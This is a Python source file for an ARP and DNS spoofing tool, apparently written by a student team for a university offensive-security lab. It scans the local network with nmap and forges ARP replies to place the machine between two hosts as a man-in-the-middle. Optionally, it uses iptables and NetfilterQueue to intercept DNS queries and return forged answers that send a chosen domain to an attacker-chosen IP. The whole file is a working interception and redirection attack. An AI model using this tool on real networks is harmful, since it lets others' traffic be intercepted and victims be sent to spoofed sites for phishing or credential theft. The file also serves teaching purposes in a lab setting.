# ARP/DNS poisoning tool
# 2IC80 - Lab on Offensive Security
# Team 99
# Andrei Pintea 1283340
# Cristina Olteanu 1227558

from scapy.all import *
import time
from sys import argv, exit
import os 
import signal, sys
from netfilterqueue import NetfilterQueue

# check for correct start                
if len(argv) != 2:
    print("Correct command: sudo python tool.py <network>\n")
    print("Example: sudo python tool.py enp0s9\n")
    exit(0) 

# colors
BLUE = "\033[96m"
WHITE = "\033[0m"
GREEN = "\033[92m"
PINK = "\033[95m"
RED = "\033[94m"

def signal_handler2(signal, frame):
    print(GREEN + "\nExiting tool." + WHITE)
    exit(0)

# handles exit before the start of the program
signal.signal(signal.SIGINT, signal_handler2)  

# -------- set options for tool -----------------------------------------------------
print(PINK + "Welcome to the ARP/DNS spoofing tool of team 99!\n")
print(BLUE + "To exit, press Ctrl+C. \n")

# display available networks with nmap
print("This tool performs ARP spoofing between two given IPs. \n\nThe tool will display the available hosts on the provided network. \n" + WHITE)
os.system('nmap -sP ' + get_if_addr(argv[1]) + '/24')
print(BLUE + "\nThe given list output shows all available IPs on the netowrk. You can choose the victim IP from here. One of the IPs is also the gateway IP. \n")
print(RED +"* Note that if you want to sniff the connection between the victim and internet, you have to provide the user's IP on the network and the gateway IP (which should be the same as your gateway IP on the network. Make sure that the inputed IPs are correct. *\n" + WHITE)

# input spoofed IPs
IP1 = raw_input("Please enter the first IP to spoof: ")
IP2 = raw_input("Please enter the second IP to spoof: ")

print(BLUE + "\nYou have different options from which you can choose bellow. To change the options, you have to exit and restart the program. \n")

# enable/disable port forwarding 
print("You can perform a MiTM attack by entering 1. Otherwise enter 0.\n")
print(RED + "* Note that if you choose to not perform a MiTM attack, the victim will notice that they will not receive response from servers. *\n" + WHITE)
forwarding = raw_input()
while int(forwarding) != 0 and int(forwarding) != 1:
    forwarding = raw_input("Please enter either 0 or 1.\n")
with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
    fd.write(forwarding)

# choose whether to perform DNS spoofing or not (for a given domain)
print(BLUE +"\nYou can also perform DNS spoofing for the sniffed communication. This requires having as spoofed IPs the IP of the victim and the IP of the default gateway. If you want to perform DNS spoofing type 1. Otheriwse type 0.\n" + WHITE)
DNSspoofing = raw_input()
while int(DNSspoofing) !=0 and int(DNSspoofing) != 1:
    DNSspoofing = raw_input("Please enter either 0 or 1.\n")
if DNSspoofing == "1":
    print(BLUE + "\nPlease enter the IP where you want to redirect communication. Make sure the IP is correct, as a wrong input will result in a crash of the tool. \n" + WHITE)
    redirectIP = raw_input()
    print(BLUE + "\nPlease input the domain for which you want to spoof communication (without www.). \n" + WHITE)
    domain = raw_input()

print(PINK + "\nlaunching tool..." + BLUE)

# ---------------------------------------------------------------

start = time.time()
        
# get all IP and MAC addresses needed
ipAttacker = get_if_addr(argv[1])       #get local IP
macAttacker = get_if_hwaddr(argv[1])    #get local MAC address
ipVictim = IP1                          #IP of first victim
macVictim = getmacbyip(ipVictim)        #MAC of first victim
ipVictim2 = IP2                         #IP of second victim
macVictim2 = getmacbyip(ipVictim2)      #MAC of second victim

# create ARP packets for spoofing
victim1 = Ether(src = macAttacker)/ARP(hwsrc = macAttacker, psrc = ipVictim2, hwdst = macVictim, pdst = ipVictim)   
victim2 = Ether(src = macAttacker)/ARP(hwsrc = macAttacker, psrc = ipVictim, hwdst = macVictim2, pdst = ipVictim2)
packets = [victim1, victim2]

# send the real ARP packets when the program exits
real1 = Ether(src = macVictim2)/ARP(hwsrc = macVictim2, psrc = ipVictim2, hwdst = macVictim, pdst = ipVictim)
real2 = Ether(src = macVictim)/ARP(hwsrc = macVictim, psrc = ipVictim, hwdst = macVictim2, pdst = ipVictim2)
realpackets = [real1, real2]

def signal_handler(signal, frame):
    #reset DNS spoofing
    global DNSspoofing
    if DNSspoofing == "1":
        q.unbind()
    os.system('iptables -F')
    os.system('iptables -X') 

    #reset ARP
    global realpackets
    sendp(realpackets, iface = argv[1])

    print(GREEN + "\nExiting tool." + WHITE)
    exit(0)

# handles exit after input
signal.signal(signal.SIGINT, signal_handler)  

# DNS spoofing function - checks if the sniffed packet is a DNS query for our domain and creates a fake reponse
def spoofedDNS(packet):
    #send ARP packets
    global start  
    global packets
    end = time.time()
    if (end - start > 60):
        sendp(packets, iface = argv[1])
        start = time.time()

    #get packet payload
    pkt = IP(packet.get_payload())

    #if the packet is not a DNS query accept it
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        #if the packet is a DNS query and it is for the spoofed domain create the spoofed response
        if domain in pkt[DNS].qd.qname: 
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=100, rdata=redirectIP))
            packet.set_payload(str(spoofed_pkt))
            packet.accept()
        #otherwise, just accept it
        else:
            packet.accept()

#--------------- main program ----------------------
       
# ARP spoofing with DNS spoofing
if DNSspoofing == "1":
    #send first packet
    sendp(packets, iface = argv[1])

    #filter packets with netfilterqueue
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')

    q = NetfilterQueue()
    q.bind(1, spoofedDNS)
   
    q.run()

# ARP spoofing without DNS spoofing
else:
    while 1:
        #send both packets every 60 seconds
        sendp(packets, iface = argv[1])
        time.sleep(60)
    

        
